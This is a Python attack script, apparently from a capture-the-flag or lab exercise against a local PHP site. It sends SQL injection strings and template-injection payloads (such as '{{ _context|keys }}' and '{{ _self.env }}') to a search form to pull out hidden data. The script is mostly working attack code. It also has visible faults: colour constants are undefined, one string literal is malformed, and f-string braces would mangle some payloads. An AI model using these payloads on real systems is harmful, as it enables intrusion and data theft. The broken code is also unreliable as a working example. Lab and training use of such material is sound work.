import requests
import re
import json

base_url = "http://127.0.0.1:8080"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

print(f"[*] ARTICLE SEARCH & DATA EXTRACTION")
print(f"[*] Testing article names/models to trigger data loading")
print(f"[*] Target: {base_url}{target_endpoint}\n")

# Test common article names and patterns
test_articles = [
    # Common product/article names
    'laptop', 'computer', 'phone', 'monitor', 'keyboard', 'mouse',
    'iphone', 'samsung', 'macbook', 'thinkpad', 'dell',
    'tv', 'television', 'headphones', 'speaker', 'camera',
    
    # Numeric patterns (model numbers)
    '123', '456', '789', '001', '002', '003',
    '100', '200', '300', '1000', '2000',
    
    # Common test patterns
    'test', 'article', 'product', 'item', 'model',
    
    # SQL injection patterns to trigger error-based info
    "' OR 1=1",
    '1", 
    "admin' --",
    "test' UNION SELECT * FROM articles--",
]

print("[*] Phase 1: Testing article name search\n")

successful_searches = []

for i, article_name in enumerate(test_articles, 1):
    try:
        print(f"Test {i}: '{article_name}'")
        
        # First search normally
        data = {'name': article_name}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        length = len(response_text)
        
        # Check if we get data back
        is_standard = "is in stock! Come back and test another one" in response_text
        has_data = not is_standard or length > 400
        
        print(f"  Length: {length}")
        
        # Extract content
        content = response_text
        match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
        if match:
            content = match.group(1)
        
        if has_data:
            print(f"  {GREEN}[+] DATA RETURNED!{RESET}")
            print(f"  Content: {content[:250]}")
            successful_searches.append({
                'query': article_name,
                'length': length,
                'response': response_text
            })
        elif not is_standard:
            print(f"  {YELLOW}[!] Non-standard response{RESET}")
            print(f"  Content: {content[:150]}")
        else:
            print(f"  [-] Standard response")
        
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] FOUND {len(successful_searches)} POTENTIAL DATA SOURCES{RESET}")
print(f"{YELLOW}{'='*60}{RESET}\n")

# If we found data, now use SSTI to extract structure
if successful_searches:
    print(f"{GREEN}[*] PHASE 2: Extracting data structure via SSTI{RESET}\n")
    
    for finding in successful_searches:
        original_query = finding['query']
        print(f"{GREEN}Testing data extraction for query: '{original_query}'{RESET}")
        
        # SSTI payloads to extract structure
        extraction_payloads = [
            f"{original_query}{{ _context|keys|join(',') }}",
            f"{original_query}{% for key in _context|keys %}{{ key }}={{ _context[key] }},{% endfor %}",
            f"{original_query}{{ articles }}",
            f"{original_query}{{ article }}",
            f"{original_query}{{ data }}",
            f"{original_query}{{ _self.env }}",
            f"{original_query}{{ dump(articles) }}",
        ]
        
        for i, payload in enumerate(extraction_payloads, 1):
            try:
                print(f"  SSTI Test {i}: {payload[:100]}")
                
                data = {'name': payload}
                response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
                
                length = len(response.text)
                
                # Extract content
                content = response.text
                match = re.search(r'<strong>(.*?)</strong>', response.text, re.DOTALL)
                if match:
                    content = match.group(1)
                
                is_standard = "is in stock! Come back" in content
                has_ssti_output = not is_standard and (length > 300 or '{{' in response.text or '{%' in response.text)
                
                print(f"    Length: {length}")
                
                if has_ssti_output:
                    print(f"    {GREEN}[!!!] SSTI EXECUTION DETECTED !!!{RESET}")
                    print(f"    Output: {content[:300]}")
                elif length > 250:
                    print(f"    {YELLOW}[+] Interesting response{RESET}")
                    print(f"    Content: {content[:200]}")
                else:
                    print(f"    [-] No special output")
                
            except Exception as e:
                print(f"    {RED}[!] Error: {str(e)}{RESET}")

else:
    print(f"{YELLOW}[!] No successful searches with data - testing SSTI on empty searches{RESET}\n")
    
    print(f"{GREEN}[*] PHASE 2: Testing SSTI with template delimiters in search{RESET}\n")
    
    # Try SSTI payloads directly as search terms
    direct_ssti_tests = [
        "{{ 7*7 }}",
        "{{ 'a'~'b' }}",
        "{{ articles }}",
        "{{ _context|keys }}",
        "{% for key in _context|keys %}{{ key }},{% endfor %}",
        "{{ dump(articles) }}",
        "{{ 1+1 }}",
        "{{ 'test'|length }}",
    ]
    
    for i, payload in enumerate(direct_ssti_tests, 1):
        try:
            print(f"Direct SSTI Test {i}: {payload}")
            
            data = {'name': payload}
            response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
            
            response_text = response.text
            length = len(response_text)
            
            # Extract content
            content = response_text
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
            
            is_standard = "is in stock! Come back" in content
            
            print(f"  Length: {length}")
            
            # Check for computed results
            if '49' in content and '{{ 7*7 }}' not in content:
                print(f"  {GREEN}[!!!] SSTI EXECUTION: 7*7 = 49 !!!!{RESET}")
            elif '2' in content and '{{ 1+1 }}' not in content:
                print(f"  {GREEN}[!!!] SSTI EXECUTION: 1+1 = 2 !!!!{RESET}")
            elif 'ab' in content and "'a'~'b'" not in content:
                print(f"  {GREEN}[!!!] SSTI EXECUTION: string concatenation !!!!{RESET}")
            elif has_data := (not is_standard and length > 300):
                print(f"  {GREEN}[+] Data extracted: {content[:250]}{RESET}")
            elif not is_standard:
                print(f"  {YELLOW}[!] Non-standard: {content[:150]}{RESET}")
            else:
                print(f"  [-] Standard response")
            
        except Exception as e:
            print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] ARTICLE SEARCH & SSTI TESTING COMPLETE{RESET}")

# Save results
with open('/tmp/article_search_results.json', 'w') as f:
    json.dump(successful_searches, f, indent=2, default=str)

print(f"\nResults saved to /tmp/article_search_results.json")
print("\nNext steps:")
print("1. Use valid article names/models to trigger data load")
print("2. Apply SSTI to extracted data structures")
print("3. Enumerate all articles via brute force or logic")
print("4. Extract full article content via loops/filters")
